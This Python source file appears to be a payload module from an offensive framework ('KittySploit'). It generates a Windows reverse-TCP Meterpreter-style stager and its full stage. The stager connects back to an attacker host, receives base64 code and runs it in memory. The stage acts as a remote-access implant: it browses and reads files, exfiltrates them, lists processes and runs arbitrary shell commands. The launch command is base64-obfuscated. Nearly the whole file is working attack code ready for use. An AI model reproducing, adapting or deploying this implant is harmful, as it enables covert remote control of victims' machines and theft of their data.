#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Windows Python Meterpreter Reverse TCP Payload
Author: KittySploit Team
Version: 2.0.0

This payload creates a small Meterpreter stager that connects back to the listener,
receives the full Meterpreter stage code, and executes it directly in memory.

REQUIREMENT: Python must be installed on the target Windows system
"""

from kittysploit import *
import json
import base64
import struct

class Module(Payload):
    __info__ = {
        'name': 'Windows Python Meterpreter, Reverse TCP',
        'description': 'Small Meterpreter stager for Windows - receives stage in memory (requires Python on target)',
        'author': 'KittySploit Team',
        'version': '2.0.0',
        'category': 'singles',
        'arch': Arch.PYTHON,
        'platform': Platform.WINDOWS,
        'listener': 'listeners/multi/meterpreter',
        'handler': Handler.REVERSE,
        'session_type': SessionType.METERPRETER,
        'references': []
    }
    
    lhost = OptString('127.0.0.1', 'Connect to IP address', True)
    lport = OptPort(4444, 'Connect to port', True)
    python_binary = OptString("python", "Python binary (python or python3)", True)
    encoder = OptString("", "Encoder", False, True)
    
    def generate(self):
        """Generate the Meterpreter stager payload code"""
        
        # Small stager that connects, receives stage, and executes it
        stager_code = f'''
import socket
import struct
import base64
import sys

def connect_and_load():
    host = '{self.lhost}'
    port = {self.lport}
    sock = None
    
    try:
        # Connect to listener
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(30)  # Longer timeout for connection
        sock.connect((host, port))
        sock.settimeout(None)  # Blocking mode after connection
        
        # Receive stage code length (4 bytes big-endian)
        length_data = b''
        while len(length_data) < 4:
            chunk = sock.recv(4 - len(length_data))
            if not chunk:
                sys.stderr.write("ERROR: Connection closed while receiving length\\n")
                return
            length_data += chunk
        
        stage_length = struct.unpack('>I', length_data)[0]
        
        # Validate stage length (max 10MB)
        if stage_length > 10 * 1024 * 1024:
            sys.stderr.write(f"ERROR: Stage length too large: {{stage_length}}\\n")
            return
        
        # Receive stage code in chunks
        stage_data = b''
        while len(stage_data) < stage_length:
            chunk = sock.recv(min(65536, stage_length - len(stage_data)))
            if not chunk:
                sys.stderr.write(f"ERROR: Connection closed while receiving stage (got {{len(stage_data)}}/{{stage_length}})\\n")
                return
            stage_data += chunk
        
        # Decode stage code
        try:
            stage_code = base64.b64decode(stage_data).decode('utf-8')
        except Exception as e:
            sys.stderr.write(f"ERROR: Failed to decode stage: {{str(e)}}\\n")
            return
        
        # Prepare execution environment with all necessary modules
        exec_globals = {{
            'sock': sock,
            'socket': socket,
            'struct': struct,
            'json': __import__('json'),
            'subprocess': __import__('subprocess'),
            'os': __import__('os'),
            'sys': sys,
            'base64': base64,
            'platform': __import__('platform'),
            'time': __import__('time'),
            'shlex': __import__('shlex'),
            '__name__': '__main__',
            '__file__': '<stage>'
        }}
        
        # Execute the stage code (Meterpreter client) in memory
        # The stage code will use the existing socket connection
        try:
            exec(compile(stage_code, '<meterpreter_stage>', 'exec'), exec_globals, exec_globals)
        except Exception as e:
            sys.stderr.write(f"ERROR: Stage execution failed: {{str(e)}}\\n")
            import traceback
            traceback.print_exc(file=sys.stderr)
            return
        
    except socket.error as e:
        sys.stderr.write(f"ERROR: Socket error: {{str(e)}}\\n")
        if sock:
            try:
                sock.close()
            except:
                pass
    except Exception as e:
        sys.stderr.write(f"ERROR: Stager error: {{str(e)}}\\n")
        import traceback
        traceback.print_exc(file=sys.stderr)
        if sock:
            try:
                sock.close()
            except:
                pass

if __name__ == '__main__':
    connect_and_load()
'''
        
        # Full Meterpreter client code (stage) that will be sent by the listener
        meterpreter_code = '''
import socket
import subprocess
import os
import sys
import json
import base64
import struct
import platform
import time
import shlex

class MeterpreterClient:
    TIMEOUT_MARKER = object()
    
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sock = None
        self.current_dir = os.getcwd()
        self.is_root = False
        self.username = os.getenv('USERNAME', os.getenv('USER', 'user'))
        self.hostname = platform.node()
        
        # Check if running as admin on Windows
        if platform.system() == 'Windows':
            try:
                import ctypes
                self.is_root = ctypes.windll.shell32.IsUserAnAdmin() != 0
            except:
                pass
        
    def connect(self):
        """Connect to the Meterpreter listener"""
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(10)
            self.sock.connect((self.host, self.port))
            self.sock.settimeout(5.0)
            return True
        except Exception as e:
            return False
    
    def _fix_encoding(self, text):
        """Fix encoding issues, especially Windows-1252/CP850 to UTF-8"""
        if not text or not isinstance(text, str):
            return text if text else ""
        
        try:
            if 'Ã' in text:
                try:
                    text = text.encode('latin1', errors='ignore').decode('utf-8', errors='replace')
                except:
                    pass
            
            try:
                text.encode('utf-8')
            except UnicodeEncodeError:
                try:
                    text = text.encode('latin1', errors='ignore').decode('windows-1252', errors='replace')
                except:
                    try:
                        text = text.encode('latin1', errors='ignore').decode('cp850', errors='replace')
                    except:
                        text = text.encode('utf-8', errors='replace').decode('utf-8', errors='replace')
        except:
            pass
        
        return text
    
    def send_response(self, data, status=0, error=""):
        """Send response to listener"""
        try:
            if not self.sock:
                return False
            
            if data is None:
                data = ""
            if not isinstance(data, str):
                data = str(data)
            
            data = self._fix_encoding(data)
            if error:
                error = self._fix_encoding(error)
            
            response = {
                'output': data,
                'status': status,
                'error': error
            }
            response_json = json.dumps(response, ensure_ascii=False)
            response_bytes = response_json.encode('utf-8')
            length = struct.pack('>I', len(response_bytes))
            self.sock.sendall(length + response_bytes)
            return True
        except (socket.error, OSError) as e:
            return False
        except Exception as e:
            return False
    
    def receive_command(self):
        """Receive command from listener"""
        try:
            length_data = b''
            while len(length_data) < 4:
                chunk = self.sock.recv(4 - len(length_data))
                if not chunk:
                    return None
                length_data += chunk
            
            length = struct.unpack('>I', length_data)[0]
            
            if length > 10 * 1024 * 1024:
                return None
            
            command_data = b''
            while len(command_data) < length:
                chunk = self.sock.recv(min(4096, length - len(command_data)))
                if not chunk:
                    return None
                command_data += chunk
            
            command_json = command_data.decode('utf-8')
            command = json.loads(command_json)
            return command
        except socket.timeout:
            return self.TIMEOUT_MARKER
        except socket.error:
            return None
        except Exception:
            return None
    
    def execute_command(self, cmd, args):
        """Execute a Meterpreter command"""
        try:
            if cmd == 'help' or cmd == '?':
                help_text = """Core Commands
=============

    Command       Description
    -------       -----------
    ?             Help menu
    background    Backgrounds the current session
    cd            Change directory
    exit          Terminate the Meterpreter session
    getpid        Get the current process identifier
    getuid        Get the user that the server is running as
    help          Help menu
    ls            List files
    pwd           Print working directory
    sysinfo       Gets information about the remote system, such as OS
    execute       Execute a command
    cat           Read the contents of a file
    ps            List running processes
    whoami        Get current user identity
    download      Download a file from target
    upload        Upload a file to target (basic)
    screenshot    Capture screenshot (base64 encoded)
    shell         Enter interactive shell or execute shell command

"""
                return help_text, 0, ""
            
            elif cmd == 'sysinfo':
                uname = platform.uname()
                output = f"Computer\\t\\t: {uname.node}\\n"
                output += f"OS\\t\\t\\t: {uname.system} {uname.release} {uname.version}\\n"
                output += f"Architecture\\t\\t: {uname.machine}\\n"
                output += f"System Language\\t\\t: {os.getenv('LANG', 'en_US.UTF-8')}\\n"
                output += f"Meterpreter\\t\\t: Python\\n"
                output += f"Python Version\\t\\t: {sys.version.split()[0]}\\n"
                return output, 0, ""
            
            elif cmd == 'getuid':
                uid = 0 if self.is_root else 1000
                return f"Server username: {self.username} ({uid})\\n", 0, ""
            
            elif cmd == 'getpid':
                return f"Current pid: {os.getpid()}\\n", 0, ""
            
            elif cmd == 'pwd':
                return self.current_dir + "\\n", 0, ""
            
            elif cmd == 'cd':
                if not args:
                    target = os.getenv('USERPROFILE', os.getenv('HOME', 'C:\\\\Users'))
                else:
                    target = args[0]
                
                if not os.path.isabs(target):
                    target = os.path.join(self.current_dir, target)
                
                target = os.path.normpath(target)
                if os.path.exists(target) and os.path.isdir(target):
                    self.current_dir = target
                    return "", 0, ""
                else:
                    return "", 1, f"cd: {target}: No such file or directory"
            
            elif cmd == 'ls':
                target = self.current_dir if not args else args[0]
                if not os.path.isabs(target):
                    target = os.path.join(self.current_dir, target)
                
                if not os.path.exists(target):
                    return "", 1, f"ls: {target}: No such file or directory"
                
                if not os.path.isdir(target):
                    return target + "\\n", 0, ""
                
                items = sorted(os.listdir(target))
                output_lines = []
                for item in items:
                    item_path = os.path.join(target, item)
                    if os.path.isdir(item_path):
                        output_lines.append(f"{item}/")
                    elif os.path.isfile(item_path):
                        size = os.path.getsize(item_path)
                        output_lines.append(f"{item} ({size} bytes)")
                    else:
                        output_lines.append(f"{item}*")
                
                return "\\n".join(output_lines) + "\\n", 0, ""
            
            elif cmd == 'cat':
                if not args:
                    return "", 1, "Usage: cat <file>"
                
                file_path = args[0]
                if not os.path.isabs(file_path):
                    file_path = os.path.join(self.current_dir, file_path)
                
                try:
                    if os.path.exists(file_path) and os.path.isfile(file_path):
                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                            return f.read(), 0, ""
                    else:
                        return "", 1, f"cat: {file_path}: No such file"
                except Exception as e:
                    return "", 1, f"cat error: {str(e)}"
            
            elif cmd == 'execute':
                if not args:
                    return "", 1, "Usage: execute <command>"
                
                command = ' '.join(args)
                try:
                    encoding = 'utf-8'
                    errors = 'replace'
                    if platform.system() == 'Windows':
                        try:
                            import locale
                            encoding = locale.getpreferredencoding() or 'cp850'
                        except:
                            encoding = 'cp850'
                    
                    result = subprocess.run(
                        command,
                        shell=True,
                        capture_output=True,
                        text=True,
                        encoding=encoding,
                        errors=errors,
                        cwd=self.current_dir,
                        timeout=30
                    )
                    stdout = self._fix_encoding(result.stdout) if result.stdout else ""
                    stderr = self._fix_encoding(result.stderr) if result.stderr else ""
                    return stdout, result.returncode, stderr
                except Exception as e:
                    return "", 1, f"execute error: {str(e)}"
            
            elif cmd == 'ps':
                try:
                    encoding = 'utf-8'
                    errors = 'replace'
                    if platform.system() == 'Windows':
                        try:
                            import locale
                            encoding = locale.getpreferredencoding() or 'cp850'
                        except:
                            encoding = 'cp850'
                        result = subprocess.run(['tasklist'], capture_output=True, text=True, encoding=encoding, errors=errors, timeout=5)
                    else:
                        result = subprocess.run(['ps', 'aux'], capture_output=True, text=True, encoding=encoding, errors=errors, timeout=5)
                    stdout = self._fix_encoding(result.stdout) if result.stdout else ""
                    stderr = self._fix_encoding(result.stderr) if result.stderr else ""
                    return stdout, 0, stderr
                except Exception as e:
                    return "", 1, f"ps error: {str(e)}"
            
            elif cmd == 'whoami':
                try:
                    if platform.system() == 'Windows':
                        encoding = 'utf-8'
                        errors = 'replace'
                        try:
                            import locale
                            encoding = locale.getpreferredencoding() or 'cp850'
                        except:
                            encoding = 'cp850'
                        result = subprocess.run(['whoami'], capture_output=True, text=True, encoding=encoding, errors=errors, timeout=5)
                        output = self._fix_encoding(result.stdout.strip()) if result.stdout else ""
                        return output + "\\n", 0, ""
                    else:
                        import pwd
                        uid = os.getuid()
                        user_info = pwd.getpwuid(uid)
                        return user_info.pw_name + "\\n", 0, ""
                except Exception as e:
                    return "", 1, f"whoami error: {str(e)}"
            
            elif cmd == 'download':
                if not args:
                    return "", 1, "Usage: download <remote_file>"
                
                file_path = args[0]
                if not os.path.isabs(file_path):
                    file_path = os.path.join(self.current_dir, file_path)
                
                try:
                    if os.path.exists(file_path) and os.path.isfile(file_path):
                        with open(file_path, 'rb') as f:
                            file_data = f.read()
                            encoded_data = base64.b64encode(file_data).decode('utf-8')
                            return encoded_data, 0, ""
                    else:
                        return "", 1, f"download: {file_path}: No such file"
                except Exception as e:
                    return "", 1, f"download error: {str(e)}"
            
            elif cmd == 'shell':
                if not args:
                    shell_cmd = 'cmd.exe' if platform.system() == 'Windows' else '/bin/bash'
                    return f"Shell: {shell_cmd}\\nType commands to execute them in the shell.\\n", 0, ""
                
                command = ' '.join(args)
                try:
                    if platform.system() == 'Windows':
                        encoding = 'utf-8'
                        errors = 'replace'
                        try:
                            import locale
                            encoding = locale.getpreferredencoding() or 'cp850'
                        except:
                            encoding = 'cp850'
                        result = subprocess.run(
                            ['cmd.exe', '/c', command],
                            shell=False,
                            capture_output=True,
                            text=True,
                            encoding=encoding,
                            errors=errors,
                            cwd=self.current_dir,
                            timeout=30
                        )
                    else:
                        result = subprocess.run(
                            command,
                            shell=True,
                            executable='/bin/bash',
                            capture_output=True,
                            text=True,
                            encoding='utf-8',
                            errors='replace',
                            cwd=self.current_dir,
                            timeout=30
                        )
                    output = self._fix_encoding(result.stdout) if result.stdout else ""
                    if result.stderr:
                        output += self._fix_encoding(result.stderr)
                    return output, result.returncode, ""
                except subprocess.TimeoutExpired:
                    return "", 1, "Command timed out (interactive commands may block)"
                except Exception as e:
                    return "", 1, f"shell error: {str(e)}"
            
            else:
                command = cmd + (' ' + ' '.join(args) if args else '')
                try:
                    result = subprocess.run(
                        command,
                        shell=True,
                        capture_output=True,
                        text=True,
                        cwd=self.current_dir,
                        timeout=30
                    )
                    return result.stdout, result.returncode, result.stderr
                except Exception as e:
                    return "", 1, f"Command error: {str(e)}"
        
        except Exception as e:
            return "", 1, f"Execution error: {str(e)}"
    
    def run(self):
        """Main loop"""
        if self.sock is None:
            if not self.connect():
                return False
        
        try:
            while True:
                command = self.receive_command()
                
                if command is self.TIMEOUT_MARKER:
                    continue
                
                if not command:
                    break
                
                cmd = command.get('command', '')
                args = command.get('args', [])
                
                if cmd.lower() == 'exit':
                    break
                
                output, status, error = self.execute_command(cmd, args)
                if not self.send_response(output, status, error):
                    break
        
        except Exception as e:
            pass
        finally:
            if self.sock:
                self.sock.close()
        
        return True

# Stage entry point - socket is passed from stager
if 'sock' in globals():
    client = MeterpreterClient(None, None)
    client.sock = sock
    client.sock.settimeout(5.0)
    client.run()

# Direct execution (for testing)
if __name__ == '__main__':
    host = sys.argv[1] if len(sys.argv) > 1 else '127.0.0.1'
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 4444
    client = MeterpreterClient(host, port)
    client.run()
'''
        
        # Store the full Meterpreter stage code for the listener to send
        self.meterpreter_stage_code = meterpreter_code
        
        # Return the command to execute the stager (small payload)
        encoded_stager = base64.b64encode(stager_code.encode('utf-8')).decode('utf-8')
        
        # Generate the command
        command = f'''{self.python_binary} -c "import base64; exec(base64.b64decode('{encoded_stager}').decode('utf-8'))"'''
        
        return command
    
    def get_stage_code(self):
        """Get the full Meterpreter stage code to send to the stager"""
        if hasattr(self, 'meterpreter_stage_code'):
            return self.meterpreter_stage_code
        # Fallback: generate it if not already generated
        self.generate()
        return self.meterpreter_stage_code
